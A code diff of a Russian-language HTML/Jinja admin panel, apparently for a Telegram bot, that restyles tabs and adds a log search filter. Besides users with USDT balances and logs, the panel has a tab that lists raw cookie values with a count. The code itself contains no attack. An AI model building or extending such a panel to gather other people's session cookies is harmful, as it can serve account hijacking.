@@ -5,7 +5,6 @@
     <title>Admin Panel</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <!-- Telegram dark style -->
     <style>
         body {
             margin: 0;
@@ -22,7 +21,7 @@
             margin-bottom: 16px;
         }
 
-        /* buttons */
+        /* ===== TABS ===== */
         .tabs {
             display: flex;
             gap: 10px;
@@ -31,21 +30,36 @@
 
         .tab {
             flex: 1;
-            padding: 10px;
+            height: 44px;
             background: #1c1c1c;
-            border-radius: 10px;
-            text-align: center;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             cursor: pointer;
             font-weight: 600;
             transition: 0.2s;
+            user-select: none;
+        }
+
+        .tab:hover {
+            background: #262626;
         }
 
         .tab.active {
             background: #2a82f5;
-            color: white;
+            color: #fff;
         }
 
-        /* sections */
+        .badge {
+            background: rgba(255,255,255,0.2);
+            padding: 3px 8px;
+            border-radius: 10px;
+            font-size: 12px;
+            margin-left: 6px;
+        }
+
+        /* ===== SECTIONS ===== */
         .section {
             display: none;
         }
@@ -54,7 +68,7 @@
             display: block;
         }
 
-        /* cards */
+        /* ===== CARDS ===== */
         .card {
             background: #1c1c1c;
             border-radius: 12px;
@@ -67,18 +81,23 @@
             font-size: 13px;
         }
 
-        .badge {
-            background: #2a82f5;
-            padding: 4px 8px;
-            border-radius: 8px;
-            font-size: 12px;
-            margin-left: 6px;
-        }
-
         pre {
             white-space: pre-wrap;
             font-size: 13px;
             margin: 0;
+        }
+
+        /* ===== SEARCH ===== */
+        .search {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            background: #1c1c1c;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
         }
     </style>
 </head>
@@ -88,22 +107,22 @@
 
     <h1>📊 Админ-панель</h1>
 
-    <!-- NAV -->
+    <!-- TABS -->
     <div class="tabs">
-        <div class="tab active" onclick="showTab('users')">👤 Пользователи</div>
-        <div class="tab" onclick="showTab('cookies')">
+        <div class="tab active" onclick="showTab('users', this)">👤 Пользователи</div>
+        <div class="tab" onclick="showTab('cookies', this)">
             🍪 Cookies <span class="badge">{{ cookies_count }}</span>
         </div>
-        <div class="tab" onclick="showTab('logs')">🧾 Логи</div>
+        <div class="tab" onclick="showTab('logs', this)">🧾 Логи</div>
     </div>
 
     <!-- USERS -->
     <div id="users" class="section active">
         {% for u in users %}
         <div class="card">
-            <div><b>UID:</b> {{ u[1] }}</div>
+            <b>{{ u[1] }}</b>
             <div class="muted">TG ID: {{ u[0] }}</div>
-            <div>Баланс: {{ u[2] }} USDT</div>
+            Баланс: {{ u[2] }} USDT
         </div>
         {% else %}
         <div class="muted">Нет пользователей</div>
@@ -113,9 +132,7 @@
     <!-- COOKIES -->
     <div id="cookies" class="section">
         {% for c in cookies %}
-        <div class="card">
-            🍪 {{ c }}
-        </div>
+        <div class="card">🍪 {{ c }}</div>
         {% else %}
         <div class="muted">Cookies отсутствуют</div>
         {% endfor %}
@@ -123,24 +140,44 @@
 
     <!-- LOGS -->
     <div id="logs" class="section">
-        {% for line in logs %}
-        <div class="card">
-            <pre>{{ line }}</pre>
+
+        <input
+            type="text"
+            class="search"
+            placeholder="🔍 Поиск по UID (например U-30CF99)"
+            oninput="filterLogs(this.value)"
+        >
+
+        <div id="logsList">
+            {% for line in logs %}
+            <div class="card log-line">
+                <pre>{{ line }}</pre>
+            </div>
+            {% else %}
+            <div class="muted">Логи пусты</div>
+            {% endfor %}
         </div>
-        {% else %}
-        <div class="muted">Логи пусты</div>
-        {% endfor %}
+
     </div>
 
 </div>
 
 <script>
-    function showTab(name) {
+    function showTab(name, el) {
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
 
         document.getElementById(name).classList.add('active');
-        event.target.classList.add('active');
+        el.classList.add('active');
+    }
+
+    function filterLogs(value) {
+        value = value.toUpperCase();
+        document.querySelectorAll('.log-line').forEach(el => {
+            el.style.display = el.innerText.toUpperCase().includes(value)
+                ? 'block'
+                : 'none';
+        });
     }
 </script>
 
